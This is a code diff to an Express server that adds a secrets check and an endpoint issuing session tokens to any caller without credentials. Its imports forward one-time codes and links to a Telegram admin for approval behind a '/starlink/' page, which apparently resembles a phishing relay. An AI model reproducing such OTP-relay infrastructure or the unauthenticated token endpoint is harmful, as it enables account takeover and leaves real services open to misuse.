@@ -4,16 +4,30 @@ const path = require('path');
 const bodyParser = require('body-parser');
 require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
 const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus } = require('./telegram-bot');
-const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog } = require('./security');
+const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog, createSession } = require('./security');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Validate critical secrets on startup
+const requiredSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
+const missingSecrets = requiredSecrets.filter(key => !process.env[key] || process.env[key].includes('your-') || process.env[key].includes('change-me') || process.env[key].includes('placeholder'));
+if (missingSecrets.length > 0) {
+    console.error('Missing or invalid environment variables:', missingSecrets.join(', '));
+    console.error('Please set these in your .env file.');
+}
 
 // Security middleware
 app.use(securityHeaders);
 app.use(corsMiddleware);
 app.use(bodyParser.json({ limit: '1mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));
+
+// Session-based auth endpoint
+app.post('/api/auth/session', rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
+    const token = createSession();
+    res.json({ success: true, token, expiresIn: 3600000 });
+});
 
 // Explicit HTML routes — must come before static middleware
 app.get('/starlink/', (req, res) => {
